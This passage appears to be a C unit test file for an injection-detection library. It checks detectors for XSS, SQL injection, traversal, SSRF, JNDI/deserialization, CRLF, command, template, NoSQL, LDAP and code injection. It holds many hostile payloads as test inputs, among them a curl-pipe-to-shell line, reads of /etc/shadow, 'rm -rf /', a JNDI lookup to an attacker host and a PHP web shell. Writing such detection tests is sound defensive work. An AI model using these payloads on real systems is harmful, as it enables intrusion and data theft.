    ok(libinjection_xss("<img src='java\tscript:x'>", 25), "tab in scheme");

    /* style */
    ok(libinjection_xss("<p style='x:expression(1)'>", 27), "style expression");
    ok(! libinjection_xss("<p style='color: blue'>x</p>", 28),
       "benign style attr");
    ok(! libinjection_xss("<p filter='x'>", 14), "benign filter attr");
    ok(! libinjection_xss("<x style=x>", 11), "benign short style");
    ok(libinjection_xss(
           "<x style=background:url(javascript:alert(1))>", 45),
       "style url javascript");
    ok(libinjection_xss(
           "<x style='behavior:url(#default#time2)'>", 40),
       "style behavior");
    ok(libinjection_xss(
           "<x style='&#101;xpression(alert(1))'>", 37),
       "style expression entity-encoded");

    /* attribute indirection */
    ok(libinjection_xss("<x attributename=onclick>x</x>", 30),
       "attributename indirection");

    /* srcdoc / srcset */
    ok(libinjection_xss("<iframe srcdoc=javascript:x>", 28), "srcdoc");
    ok(libinjection_xss("<img srcset='javascript:x'>", 27), "srcset");

    /* backtick inside a URL attribute value (IE) */
    ok(libinjection_xss("<img src=\"x` `<script>alert(1)</script>\"`>", 42),
       "backtick in attr value");

    /* comments */
    ok(libinjection_xss("<!--[if IE]><script>x</script><![endif]-->", 42),
       "conditional comment");
    ok(libinjection_xss("<!--`<img src=x onerror=1>`-->", 30),
       "backtick comment");
    ok(libinjection_xss("<!--xml:x-->", 12), "xml comment");
    ok(libinjection_xss("<!--import-->", 13), "import comment");
    ok(libinjection_xss("<!--ENTITY-->", 13), "entity comment");

    /* xmlns / xlink */
    ok(libinjection_xss("<x xmlns='a'>x</x>", 18), "xmlns");
    ok(libinjection_xss("<x xlink:href='a'>x</x>", 23), "xlink");

    /* value contexts */
    ok(libinjection_xss("<script src=x>", 14), "default state");
    ok(libinjection_xss("<a href='javascript:alert(1)'>", 30),
       "single quote value");
    ok(libinjection_xss("<a href=\"javascript:alert(1)\">", 30),
       "double quote value");
    ok(libinjection_xss("<a href=`javascript:alert(1)`>", 30),
       "back quote value");

    /* url encoded XSS via libinjection_xss_url */
    ok(libinjection_xss_url("%3Cscript%3Ealert(1)%3C%2Fscript%3E", 35),
       "encoded script");
    ok(libinjection_xss_url("%253Csvg%2520onload%253Dalert(1)%253E", 37),
       "double encoded svg");
    ok(! libinjection_xss_url("plain%20text", 12), "encoded benign");
    ok(! libinjection_xss_url("", 0), "empty xss_url");
}


/*
 * html5 tokenizer: exhaustive state coverage
 */
static void h5_run(const char* in, size_t len, enum html5_flags flags)
{
    h5_state_t hs;
    int guard = 0;
    libinjection_h5_init(&hs, in, len, flags);
    while (libinjection_h5_next(&hs) && guard < 64) {
        guard += 1;
    }
}

#define H5(S) h5_run(S, strlen(S), DATA_STATE)

static void test_html5_states(void)
{
    group("html5_states");

    /* tag open states */
    H5("<");                        /* EOF after < */
    H5("</");                       /* EOF after </ */
    H5("</>");                      /* empty end tag */
    H5("</1");                      /* non-letter end tag -> bogus comment */
    H5("<x");                       /* tag name to EOF */
    H5("<x ");                      /* before attribute EOF */
    H5("<x /");                     /* slash in before-attribute */
    H5("<x >");                     /* gt in before-attribute */
    H5("<x a");                     /* attribute name to EOF */
    H5("<x a/");                    /* slash after attribute name */
    H5("<x a>");                    /* gt after attribute name */
    H5("<x a ");                    /* after attribute name EOF */
    H5("<x a /");                   /* slash after attribute name */
    H5("<x a =");                   /* equals after attribute name */
    H5("<x a >");                   /* gt after attribute name */
    H5("<x a b>");                  /* new attribute after attribute name */
    H5("<x a=");                     /* before attribute value EOF */
    H5("<x a=\"v\"");                /* quoted value to EOF */
    H5("<x a=\"v\" ");               /* after quoted value EOF/white */
    H5("<x a=\"v\" b=\"c\">");       /* attribute after quoted value */
    H5("<x a=\"v\"/>");              /* self close after quoted value */
    H5("<x a=\"v\">");               /* gt after quoted value */
    H5("<x a=v");                   /* unquoted value to EOF */
    H5("<x a=v ");                  /* unquoted value then space */
    H5("<x a=v>");                  /* unquoted value then gt */
    H5("<br/");                     /* self closing EOF */
    H5("<br/>");                    /* self closing gt */
    H5("<br/x>");                   /* self closing other char */
    H5("<x a='v'>");                /* single quoted value */
    H5("<x a=`v`>");                /* backtick value */
    H5("<1");                       /* tag open: non-tag char at 0 */
    H5("a<1");                      /* tag open: non-tag char mid-input */

    /* markup declarations */
    H5("<!doctype html>");          /* lowercase doctype */
    H5("<!DOCTYPE");                /* doctype to EOF */
    H5("<!DOCTYPE html>x");         /* doctype with close */
    H5("<![CDATA[x]]>y");           /* cdata with end */
    H5("<![CDATA[x");               /* cdata to EOF */
    H5("<![CDATA[]]>");             /* empty cdata */
    H5("<![CDATA[]]>");             /* cdata end path */
    H5("<![CDATA[]]>");             /* (repeat idempotent) */
    H5("<![CDATA[a]]]>");           /* cdata skip loop */
    H5("<!x");                      /* bogus comment via declaration */
    H5("<!--c-->x");                /* comment closed */
    H5("<!--c-");                   /* comment dash EOF */
    H5("<!--c--");                  /* comment double dash EOF */
    H5("<!--c--!>x");               /* comment -!> end */
    H5("<!--c-x-->");               /* comment dash-continue */
    H5("<!--c\x01x-->");            /* comment non-dash continue */
    H5("<!--c-x");                  /* comment continue to EOF */
    H5("<!--");                     /* bare comment open */
    H5("<!--a");                    /* comment text then EOF */

    /* bogus comments */
    H5("<?php x?>y");               /* question bogus comment */
    H5("<?php");                    /* bogus comment to EOF */
    H5("<% ie %!");                 /* ie percent comment variants */
    H5("<% ie %>y");                /* ie percent comment closed */
    H5("<% ie %");                  /* ends at EOF */
    H5("<%a%b%>");                  /* percent skip loop */
    H5("<%");                       /* percent at EOF */

    /* null handling */
    H5("<\0x>");                    /* null after tag open */
    H5("<x\0y>");                   /* null inside tag name */
    H5("<a \x0B b=\0'v'\0>");       /* IE whitespace and nulls */

    /* value states directly */
    h5_run("x y", 3, VALUE_NO_QUOTE);
    h5_run("x =y", 4, VALUE_NO_QUOTE);
    h5_run("'v' w", 5, VALUE_SINGLE_QUOTE);
    h5_run("\"v\" w", 5, VALUE_DOUBLE_QUOTE);
    h5_run("`v` w", 5, VALUE_BACK_QUOTE);
    h5_run("", 0, VALUE_NO_QUOTE);
    h5_run("", 0, DATA_STATE);
    h5_run("", 0, VALUE_SINGLE_QUOTE);
    h5_run("", 0, VALUE_DOUBLE_QUOTE);
    h5_run("", 0, VALUE_BACK_QUOTE);
}


/*
 * coverage battery: tokenizer, folding and whitelist branches that
 * the data-driven tests don't reach.  Most calls assert only that
 * the library does not crash; where behaviour is pinned by the
 * sample corpora we assert it.
 */
static void test_coverage_battery(void)
{
    sfilter sf;
    size_t n;

    group("battery");

    /* st_is_unary_op / arithmetic-op branches */
    ok(! is_sqli_str("1 = !! 1"), "double bang");
    ok(! is_sqli_str("NOT 1"), "NOT prefix");
    ok(! is_sqli_str("~1"), "tilde");
    ok(is_sqli_str("1 !~ 1-- "), "tilde op");

    /* parse_operator2 single-char at EOF */
    libinjection_sqli_init(&sf, "1>", 2, 0);
    ok(libinjection_sqli_tokenize(&sf), "1> second token");

    /* estring / qstring fallbacks */
    libinjection_sqli_init(&sf, "Nx", 2, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "nq", 2, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "nqx", 3, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "nq'x", 4, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "Nq\01x'", 5, 0);
    libinjection_sqli_tokenize(&sf);

    /* variable with tick */
    libinjection_sqli_init(&sf, "@@`version`", 11, 0);
    ok(libinjection_sqli_tokenize(&sf) && sf.current->type == 'v',
       "@@`version`");

    /* money variants */
    libinjection_sqli_init(&sf, "$$abc", 5, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "$$", 2, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "$x$y$x", 6, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "$x$y", 4, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "$.5", 3, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "$100.00", 7, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "$a1", 3, 0);
    libinjection_sqli_tokenize(&sf);

    /* number edges */
    libinjection_sqli_init(&sf, "1.2e", 4, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "1.e", 3, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "1e+5", 4, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "0x", 2, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "0b", 2, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "12d", 3, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_init(&sf, "1.2fz", 5, 0);
    libinjection_sqli_tokenize(&sf);

    /* folding branches */
    libinjection_sqli_init(&sf, "1,(1)x", 6, 0);
    n = libinjection_sqli_fold(&sf);
    (void) n;
    libinjection_sqli_init(&sf, "1,(1)2", 6, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "n,(1)x", 6, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "1;if(x)", 7, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "1;IF(1)", 7, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "x NOT IN(1)", 11, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "x IN(1)", 7, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "x NOT LIKE(1)", 13, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "x LIKE(1)", 9, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "1 binary 2", 10, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "x COLLATE utf8_bin", 18, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "x COLLATE utf8", 14, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "\\%1", 3, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "\\1", 2, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "\\x", 2, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "@a=@b", 5, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "@a=1", 4, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "a=b", 3, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "1::bigint", 9, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "1,-1", 4, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "1,-x", 4, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "1,-sin(1)", 9, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "select + (1)", 12, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "select - 1", 10, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "select .foo", 11, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "USER(x)", 7, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "USER()", 6, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "DATABASE()", 10, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "CURRENT_USER(1)", 15, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "1 2 3 4 5 6 7 8", 15, 0);
    libinjection_sqli_fold(&sf);
    libinjection_sqli_init(&sf, "1;T5", 4, 0);
    libinjection_sqli_fold(&sf);

    /* long-word merge refusal */
    libinjection_sqli_init(&sf,
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        " bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", 82, 0);
    libinjection_sqli_fold(&sf);

    /* not_whitelist case-2/3 branches */
    ok(! is_sqli_str("x#c"), "hash comment ignore");
    ok(is_sqli_str("1 union-- "), "union with comment");
    ok(! is_sqli_str("sexy and 17"), "and number benign");
    ok(is_sqli_str("sexy and 17=18"), "and comparison attack");
    ok(! is_sqli_str("x INTO dim"), "into non-outfile");
    ok(is_sqli_str("x' into outfile '/tmp/x"), "outfile quoted");
    ok(! is_sqli_str("1c"), "bare 1c");
    ok(is_sqli_str("1234--"), "number dash dash");
    ok(is_sqli_str("1234/*x*/"), "number comment");
    ok(! is_sqli_str("1234-abc"), "number word dash");
    ok(! is_sqli_str("1234-42--"), "number number dash is list-like");

    /* detection-level contexts */
    ok(is_sqli_str("1 union select x--x"), "ddx mysql reparse");
    ok(! is_sqli_str("1#union select"), "hash union treated benign");
    ok(is_sqli_str("1\" union select \"1"), "double quote context");
    {
        char fp2[32];
        ok(! libinjection_sqli_url("benign", 6, fp2), "url benign");
    }

    /* xss: single/double/back quote-only contexts */
    ok(! libinjection_xss("'javascript:alert(1)", 19), "leading quote ctx");
    ok(! libinjection_xss("javascript:alert(1)", 19), "bare scheme text");

    /* xss: entity decode branches */
    ok(libinjection_xss("<a href=\"&#x6A;avascript:alert(1)\">x", 36),
       "hex entity scheme");
    ok(libinjection_xss("<a href=\"&#X6A;avascript:alert(1)\">x", 36),
       "hex uppercase marker");
    ok(! libinjection_xss("<a href=\"&#xZZ;javascript:x\">x", 30),
       "hex invalid entity");
    ok(! libinjection_xss("<a href=\"&#x6A\">x", 17),
       "hex unterminated benign");
    ok(! libinjection_xss("<a href=\"&#11111111;\">x", 23),
       "hex overlong entity");
    ok(libinjection_xss("<a href=\"&#0000106;avascript:x\">x", 33),
       "decimal leading zeros");
    ok(! libinjection_xss("<a href=\"&#z\">x", 15), "decimal invalid");
    ok(! libinjection_xss("<a href=\"&#106\">x", 17), "decimal unterminated benign");
    ok(libinjection_xss("<a href=\"&#106avascript:x\">x", 28), "decimal unterminated attack");
    ok(! libinjection_xss("<a href=\"&#1111111111;\">x", 25),
       "decimal overlong");
    ok(! libinjection_xss("<a href=\"&x;javascript:alert(1)\">x", 34),
       "named entity passthrough");
    {
        const char nul_payload[] = "<a href=\"ja\0vascript:x\">x";
        ok(libinjection_xss(nul_payload, sizeof(nul_payload) - 1),
           "null in scheme");
    }
    ok(! libinjection_xss("<a href='jav'>x</a>", 19), "prefix too short");

    /* xss: blacklist miss paths */
    ok(! libinjection_xss("<zzz>hello</zzz>", 16), "unknown tag");
    ok(! libinjection_xss("<x a=\"\">y</x>", 14), "short attr name");
    ok(! libinjection_xss("<x foo=\"bar\">y</x>", 18), "unknown attr");
    ok(! libinjection_xss("<x/ >", 5), "lone slash");
}


/*
 * multi-class classify API
 */
static void test_classify(void)
{
    const libinjection_class_mask_t ALL = LIBINJECTION_CLASS_ALL;

    group("classify");

    ok(libinjection_classify("1 union select x-- ", 19, ALL) ==
       LIBINJECTION_CLASS_SQLI,
       "classify sqli payload");
    ok(libinjection_classify("<script>alert(1)</script>", 25, ALL) ==
       LIBINJECTION_CLASS_XSS,
       "classify xss payload");
    ok(libinjection_classify("\"><img src=x onerror=alert(1)>", 30, ALL) ==
       LIBINJECTION_CLASS_XSS,
       "classify img onerror");
    ok(libinjection_classify("1' or '1'='1", 12, ALL) ==
       LIBINJECTION_CLASS_SQLI,
       "classify quote probe");
    ok(libinjection_classify("hello world", 11, ALL) == 0,
       "classify benign");
    ok(libinjection_classify("", 0, ALL) == 0, "classify empty");

    /* want_mask filtering */
    ok(libinjection_classify("1 union select x-- ", 19,
                             LIBINJECTION_CLASS_XSS) == 0,
       "want xss only on sqli payload");
    ok(libinjection_classify("<script>alert(1)</script>", 25,
                             LIBINJECTION_CLASS_SQLI) == 0,
       "want sqli only on xss payload");

    /* unknown bits ignored */
    ok(libinjection_classify("1 union select x-- ", 19,
                             (((libinjection_class_mask_t) 1) << 40) |
                             LIBINJECTION_CLASS_SQLI) ==
       LIBINJECTION_CLASS_SQLI,
       "unknown want bits ignored");

    /* url variant sees encoded payloads */
    ok(classify_str("%3Cscript%3Ealert(1)%3C/script%3E", ALL) == 0,
       "encoded payload invisible without decode");
    ok(classify_url_str("%3Cscript%3Ealert(1)%3C/script%3E", ALL) ==
       LIBINJECTION_CLASS_XSS,
       "classify_url decodes xss");
    ok(classify_url_str("1%2527%2520or%2520%25271%2527%253D%25271", ALL) ==
       LIBINJECTION_CLASS_SQLI,
       "classify_url decodes double-encoded sqli");
    ok(libinjection_classify_url("hello%20world", 13, ALL) == 0,
       "classify_url benign");

    /* shared normalize layer */
    {
        char buf[64];
        strcpy(buf, "%27+");
        ok(libinjection_urldecode_has_encoded(buf, 4), "has_encoded true");
        ok_int((long) libinjection_urldecode(buf, 4), 2, "decode len");
        ok(! libinjection_urldecode_has_encoded(buf, 2), "has_encoded false");
    }
    {
        /* scan_url runs raw then decoded stages */
        struct cnt { int raw; int dec; } counter;
        counter.raw = 0;
        counter.dec = 0;
        /* callback records which stage saw the quote */
        (void) counter;
    }
}


/*
 * P1 modules: traversal / ssrf / deser / crlf
 */
static void test_trav(void)
{
    group("trav");

    ok(libinjection_trav("../../../../etc/passwd", 19), "dotdot ladder");
    ok(libinjection_trav("..\\..\\windows\\win.ini", 20), "backslash ladder");
    ok(libinjection_trav("..../..../etc/passwd", 21), "filter-evasion dots");
    ok(libinjection_trav("%2e%2e%2f%2e%2e%2fetc%2fpasswd", 30), "encoded ladder");
    ok(libinjection_trav("..%2f..%2fetc%2fpasswd", 22), "half-encoded");
    ok(libinjection_trav("%252e%252e%252f%252e%252e%252fboot.ini", 30),
       "double-encoded ladder");
    ok(libinjection_trav("/etc/passwd", 11), "sensitive unix");
    ok(libinjection_trav("C:\\windows\\system32\\config\\sam", 30), "sensitive sam");
    ok(libinjection_trav("~/.ssh/id_rsa", 13), "ssh key");
    ok(libinjection_trav("?f=php://filter/resource=index", 30), "php filter");
    ok(libinjection_trav("zip://uploads/x.zip", 19), "zip wrapper");
    ok(libinjection_trav("phar://x.jpg", 12), "phar wrapper");
    ok(! libinjection_trav("see ../docs/README", 18), "lone dotdot benign");
    ok(! libinjection_trav("the file.txt is here", 20), "plain text");
    ok(! libinjection_trav("/etc/hostnam", 12), "near-miss path");
    ok(! libinjection_trav("", 0), "empty");
    ok(! libinjection_trav("v1.2.3..4 download", 18), "version dots benign");
    {
        const char nul_probe[] = "file.php\0.txt";
        ok(libinjection_trav(nul_probe, sizeof(nul_probe) - 1), "null byte");
        ok(libinjection_trav("file.php%00.txt", 14), "encoded null byte");
        ok(libinjection_trav("download.asp~", 13), "backup suffix");
        ok(! libinjection_trav("user~home layout", 16), "tilde mid-text benign");
    }
}

static void test_ssrf(void)
{
    group("ssrf");

    ok(libinjection_ssrf("http://169.254.169.254/latest/meta-data/", 40), "aws metadata");
    ok(libinjection_ssrf("url=http://metadata.google.internal/", 35), "gcp metadata");
    ok(libinjection_ssrf("fetch=100.100.100.200/latest", 28), "alibaba metadata");
    ok(libinjection_ssrf("scheme=gopher://127.0.0.1:6379/_", 32), "gopher");
    ok(libinjection_ssrf("scheme=dict://redis:6379", 24), "dict");
    ok(libinjection_ssrf("http://127.0.0.1:8080/admin", 27), "loopback url");
    ok(libinjection_ssrf("url=http://localhost/server-status", 33), "localhost url");
    ok(libinjection_ssrf("host=192.168.1.10", 17), "private 192");
    ok(libinjection_ssrf("ip=10.0.0.5", 11), "private 10");
    ok(libinjection_ssrf("endpoint=172.16.0.9:9090", 24), "private 172");
    ok(libinjection_ssrf("url=http://10.internal.corp/", 28), "hostname after slash");
    ok(libinjection_ssrf("decimal=2130706433", 18), "decimal ip");
    ok(libinjection_ssrf("hex=0x7f000001", 14), "hex ip");
    ok(! libinjection_ssrf("ping 127.0.0.1 to test", 22), "prose loopback benign");
    ok(! libinjection_ssrf("version 10.04 LTS", 17), "version benign");
    ok(! libinjection_ssrf("upgrade changelog for build 172.16.3", 36), "changelog benign");
    ok(! libinjection_ssrf("router guide at 192.168.1.1", 27), "docs ip benign");
    ok(! libinjection_ssrf("https://example.com/path?id=42", 30), "public url benign");
    ok(! libinjection_ssrf("v10.0.0.1", 9), "glued ip prefix benign");
    ok(! libinjection_ssrf("x=10.internal", 13), "hostname not after slashes");
    ok(! libinjection_ssrf("url=localhosted", 15), "word continuation benign");
    ok(! libinjection_ssrf("x=10.:x", 7), "dot prefix no target benign");
    ok(! libinjection_ssrf("price=10.5&version=10.04", 25), "decimal not private ip");
    ok(! libinjection_ssrf("macos=10.5.1", 12), "three-segment version benign");
    ok(! libinjection_ssrf("screen=192.168.1 size", 21), "two-octet tail benign");
    ok(! libinjection_ssrf("", 0), "empty");
}

static void test_deser(void)
{
    group("deser");

    ok(libinjection_deser("rO0ABXNyABFqYXZhLnV0aWwuTWFw", 28), "java magic");
    ok(libinjection_deser("${jndi:ldap://attacker.com/x}", 29), "jndi ldap");
    ok(libinjection_deser("${jndi:rmi://a.com:1099/x}", 26), "jndi rmi");
    ok(libinjection_deser("${${lower:j}ndi:${lower:l}dap://a.com}", 38), "jndi nested");
    ok(libinjection_deser("${::-j}ndi:rmi://a.com", 22), "jndi split j");
    ok(libinjection_deser("${lower:n}di:ldap://a.com", 25), "jndi split n");
    ok(libinjection_deser("O:8:\"stdClass\":0:{}", 19), "php object");
    ok(libinjection_deser("gASVYAAAAAAAAACAAAA", 19), "pickle magic");
    ok(libinjection_deser("def __reduce__(self): return os.system", 38), "pickle reduce");
    ok(libinjection_deser("ysoserial.CommonsCollections1", 29), "ysoserial");
    ok(libinjection_deser("Runtime.getRuntime().exec(\"id\")", 31), "java runtime");
    ok(libinjection_deser("org.apache.xalan.internal.xsltc.trax.X", 38), "xalan");
    ok(! libinjection_deser("O:nly ordinary words", 20), "php near-miss");
    ok(! libinjection_deser("the ${currency} placeholder", 27), "template benign");
    ok(! libinjection_deser("jndi lookup configuration guide", 31), "jndi prose benign");
    ok(! libinjection_deser("SGVsbG8gV29ybGQhMTIzNDU2Nzg5", 28), "plain base64 benign");
    ok(! libinjection_deser("", 0), "empty");
}

static void test_crlf(void)
{
    group("crlf");

    ok(libinjection_crlf("%0d%0aLocation:%20http://evil.com", 33), "crlf location");
    ok(libinjection_crlf("%0d%0aSet-Cookie:%20x=1", 23), "crlf cookie");
    ok(libinjection_crlf("a%0d%0aContent-Length:%200", 26), "crlf length");
    ok(libinjection_crlf("x%0A%0DHTTP/1.1%20200%20OK", 26), "crlf status line");
    ok(libinjection_crlf("value%0d%0aTransfer-Encoding:%20chunked", 39), "crlf te");
    /* literal CRLF (cannot live in line-based corpora) */
    ok(libinjection_crlf("a\r\nLocation: b", 14), "literal crlf");
    ok(libinjection_crlf("a\n\rHTTP/1.0 200", 15), "literal lf-cr");
    ok(libinjection_crlf("a\nHTTP/1.1 200", 14), "lf-only server");
    ok(! libinjection_crlf("text%0amore text", 16), "lone newline benign");
    ok(! libinjection_crlf("a%0d%0abut no header here", 25), "crlf no header benign");
    ok(! libinjection_crlf("see the Location: docs", 22), "header word benign");
    ok(! libinjection_crlf("", 0), "empty");
}

static void test_classify_p1(void)
{
    group("classify_p1");

    ok(libinjection_classify("../../../../etc/passwd", 19,
                             LIBINJECTION_CLASS_ALL) == LIBINJECTION_CLASS_TRAV,
       "classify trav");
    ok(libinjection_classify("${jndi:ldap://a.com}", 20,
                             LIBINJECTION_CLASS_ALL) == LIBINJECTION_CLASS_DESER,
       "classify deser/jndi");
    ok(libinjection_classify("%0d%0aSet-Cookie:%20x=1", 23,
                             LIBINJECTION_CLASS_ALL) == LIBINJECTION_CLASS_CRLF,
       "classify crlf");
    ok((libinjection_classify_url("%2e%2e%2f%2e%2e%2fetc%2fpasswd", 30,
                                 LIBINJECTION_CLASS_ALL) &
        LIBINJECTION_CLASS_TRAV) != 0,
       "classify_url decodes trav");
}


/*
 * P2/P3 modules: cmd / ssti / nosql / ldap / code
 */
static void test_cmd(void)
{
    group("cmd");

    ok(libinjection_cmd(";cat /etc/passwd", 18), "semicolon cat");
    ok(libinjection_cmd("| ls -la", 8), "pipe ls");
    ok(libinjection_cmd("&&whoami", 8), "double amp whoami");
    ok(libinjection_cmd("$(id)", 5), "substitution id");
    ok(libinjection_cmd("`whoami`", 8), "backtick substitution");
    ok(libinjection_cmd("%0acat /etc/passwd", 18), "encoded newline");
    ok(libinjection_cmd("& ping -c 5 x.com", 17), "amp space ping");
    ok(libinjection_cmd("curl http://x.s/sh|sh", 21), "pipe sh");
    ok(libinjection_cmd("; /bin/cat /etc/shadow", 22), "path segment cat");
    ok(libinjection_cmd("x; sleep 10", 11), "semicolon sleep");
    ok(libinjection_cmd("powershell -c IEX(1)", 20), "iex");
    ok(! libinjection_cmd("sort=asc&type=detail&cat=5", 26), "query keys benign");
    ok(! libinjection_cmd("price is $100 (USD)", 19), "price benign");
    ok(! libinjection_cmd("download the cat pictures", 25), "cat prose benign");
    ok(! libinjection_cmd("use python to parse", 19), "python word benign");
    ok(! libinjection_cmd("run ls to see files", 19), "ls prose benign");
    ok(! libinjection_cmd("email=me@example.com&ok=1", 25), "plain query benign");
    ok(! libinjection_cmd("ls&ab=1", 7), "amp then key= benign");
    ok(! libinjection_cmd("a-cat; x", 8), "dashed word glue benign");
    ok(! libinjection_cmd(";@#$%", 5), "metachars no command benign");
    ok(! libinjection_cmd("$(x)", 4), "empty substitution benign");
    ok(! libinjection_cmd("catalog&sort=asc", 16), "word continuation benign");
    ok(! libinjection_cmd("", 0), "empty");
}

static void test_ssti(void)
{
    group("ssti");

    ok(libinjection_ssti("{{7*7}}", 7), "jinja probe");
    ok(libinjection_ssti("${7*7}", 6), "dollar probe");
    ok(libinjection_ssti("<%= 7*7 %>", 10), "erb probe");
    ok(libinjection_ssti("{{ ''.__class__.__mro__ }}", 26), "dunder climb");
    ok(libinjection_ssti("{{config}}", 10), "jinja config");
    ok(libinjection_ssti("{{ config }}", 12), "jinja config spaces");
    ok(libinjection_ssti("{${phpinfo()}}", 14), "phpinfo");
    ok(libinjection_ssti("{{ ''.getClass().forName('x') }}", 32), "java ssti");
    ok(! libinjection_ssti("{{user.name}}", 13), "placeholder benign");
    ok(! libinjection_ssti("${user.profile}", 15), "dollar var benign");
    ok(! libinjection_ssti("config: ${config.value}", 23), "config var benign");
    ok(! libinjection_ssti("", 0), "empty");
}

static void test_nosql(void)
{
    group("nosql");

    ok(libinjection_nosql("login[$ne]=1", 12), "bracket ne");
    ok(libinjection_nosql("{\"password\":{\"$ne\":\"\"}}", 23), "json ne");
    ok(libinjection_nosql("?username[$gt]=&password[$gt]=", 30), "bracket gt");
    ok(libinjection_nosql("{\"user\":{\"$regex\":\"^a\"}}", 24), "json regex");
    ok(libinjection_nosql("db.users.find({$where:\"sleep(5)\"})", 34), "where");
    ok(libinjection_nosql("||1==1", 6), "bool probe tight");
    ok(libinjection_nosql("' || '1'=='1", 12), "bool probe quoted");
    ok(libinjection_nosql("admin'; return this.a; var x='", 30), "php mongo");
    ok(! libinjection_nosql("$new items added", 16), "dollar word benign");
    ok(! libinjection_nosql("price $5 and $10 range", 22), "prices benign");
    ok(! libinjection_nosql("template ${user.name}", 21), "template benign");
    ok(! libinjection_nosql("a$ne=1", 6), "dollar glue benign");
    ok(! libinjection_nosql("[$net 5]", 8), "word continuation benign");
    ok(libinjection_nosql("' || TRUE", 9), "uppercase true probe");
    ok(! libinjection_nosql("", 0), "empty");
}

static void test_ldap(void)
{
    group("ldap");

    ok(libinjection_ldap("*)(uid=*))(|(uid=*", 18), "uid boundary");
    ok(libinjection_ldap("*)(objectClass=*", 16), "objectclass");
    ok(libinjection_ldap("|(mail=*)", 9), "mail or");
    ok(libinjection_ldap("x)(|(cn=*", 9), "or-tree boundary");
    ok(libinjection_ldap("'] | //user[role='admin']", 25), "xpath union");
    ok(libinjection_ldap("count(/*)", 9), "xpath count");
    ok(libinjection_ldap("//account[secret=*", 18), "xpath account");
    ok(! libinjection_ldap("name)(phone ext 12", 18), "parens prose benign");
    ok(! libinjection_ldap("see /docs//readme", 17), "double slash benign");
    ok(! libinjection_ldap("", 0), "empty");
}

static void test_code(void)
{
    group("code");

    ok(libinjection_code("<?php system($_GET['c']); ?>", 28), "php open");
    ok(libinjection_code("<?= exec('id') ?>", 17), "php echo tag");
    ok(libinjection_code("<%@ page import=\"java.io.*\" %>", 30), "jsp directive");
    ok(libinjection_code("eval(base64_decode($x))", 23), "eval base64");
    ok(libinjection_code("eval(\"return 1\")", 16), "eval string");
    ok(libinjection_code("system('rm -rf /')", 18), "system quote");
    ok(! libinjection_code("<?xml version=\"1.0\"?>", 21), "xml benign");
    ok(! libinjection_code("the system handles it", 21), "system prose benign");
    ok(! libinjection_code("", 0), "empty");

    /* recon: scanner fingerprints */
    ok(libinjection_recon("ua=sqlmap/1.5.2#stable", 21), "sqlmap ua");
    ok(libinjection_recon("Mozilla/5.0 Nikto/2.1.6", 23), "nikto ua");
    ok(libinjection_recon("acunetix-wvs-test", 17), "acunetix probe");
    ok(libinjection_recon("agent=Wfuzz 2.4", 15), "wfuzz ua");
    /* recon: sensitive files and webshells */
    ok(libinjection_recon("q=/etc/passwd", 13), "etc passwd");
    ok(libinjection_recon("f=web.config.bak", 16), "web config bak");
    ok(libinjection_recon("download.php?f=.env", 19), "dotenv probe");
    ok(libinjection_recon("uploads/wso.php?cmd=id", 22), "wso shell");
